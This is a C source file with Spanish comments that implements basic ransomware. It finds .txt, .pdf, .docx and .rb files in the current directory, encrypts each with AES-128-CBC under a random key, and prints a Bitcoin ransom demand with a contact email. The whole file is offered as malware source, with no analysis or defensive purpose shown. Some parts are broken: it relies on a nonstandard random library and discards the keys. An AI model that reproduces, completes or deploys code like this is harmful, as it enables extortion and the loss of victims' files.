#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <openssl/aes.h>
#include <random.h>

#define IV_SIZE AES_BLOCK_SIZE
#define KEY_SIZE 16 // Tamaño de la clave en bytes (128 bits)

void aes_encrypt_file(const char *in_filename, const char *out_filename, const unsigned char *key, const unsigned char *iv) {
    FILE *in_file = fopen(in_filename, "rb");
    FILE *out_file = fopen(out_filename, "wb");
    if (in_file == NULL || out_file == NULL) {
        printf("Error al abrir el archivo.\n");
        return;
    }

    AES_KEY aes_key;
    if (AES_set_encrypt_key(key, 128, &aes_key) < 0) {
        printf("Error al establecer la clave de cifrado.\n");
        return;
    }

    fwrite(iv, 1, IV_SIZE, out_file); // Escribir IV en el archivo

    unsigned char in_data[AES_BLOCK_SIZE];
    unsigned char out_data[AES_BLOCK_SIZE];
    int num_bytes_read;

    while ((num_bytes_read = fread(in_data, 1, AES_BLOCK_SIZE, in_file)) > 0) {
        if (num_bytes_read < AES_BLOCK_SIZE) {
            memset(in_data + num_bytes_read, 0, AES_BLOCK_SIZE - num_bytes_read);
        }
        AES_cbc_encrypt(in_data, out_data, AES_BLOCK_SIZE, &aes_key, iv, AES_ENCRYPT);
        fwrite(out_data, 1, AES_BLOCK_SIZE, out_file);
    }

    fclose(in_file);
    fclose(out_file);
}

void ransom_message() {
    printf("¡Tus archivos han sido cifrados!\n");
    printf("Para recuperar tus archivos, debes pagar un rescate de $1000 en Bitcoin a la siguiente dirección: xxxxxxxxxxxxxxx.\n");
    printf("Una vez realizado el pago, envía la prueba de pago a ransomware@example.com y te proporcionaremos la clave para descifrar tus archivos.\n");
}

int main() {
    DIR *dir;
    struct dirent *ent;

    // Inicializar la semilla aleatoria
    random_set_seed();

    if ((dir = opendir(".")) != NULL) {
        while ((ent = readdir(dir)) != NULL) {
            if (ent->d_type == DT_REG) { // Solo ciframos archivos regulares
                char *extension = strrchr(ent->d_name, '.');
                if (extension && (strcmp(extension, ".txt") == 0 || strcmp(extension, ".pdf") == 0 || strcmp(extension, ".docx") == 0 || strcmp(extension, ".rb") == 0)) { // Extensiones permitidas
                    char out_filename[strlen(ent->d_name) + 5]; // ".enc" + '\0'
                    strcpy(out_filename, ent->d_name);
                    strcat(out_filename, ".enc");

                    // Generar clave aleatoria
                    unsigned char key[KEY_SIZE];
                    for (int i = 0; i < KEY_SIZE; ++i) {
                        key[i] = random_generate_byte();
                    }

                    // Generar IV aleatorio
                    unsigned char iv[IV_SIZE];
                    for (int i = 0; i < IV_SIZE; ++i) {
                        iv[i] = random_generate_byte();
                    }

                    aes_encrypt_file(ent->d_name, out_filename, key, iv);
                }
            }
        }
        closedir(dir);
    } else {
        printf("Error al abrir el directorio.\n");
        return 1;
    }

    // Mostramos el mensaje de rescate
    ransom_message();

    return 0;
}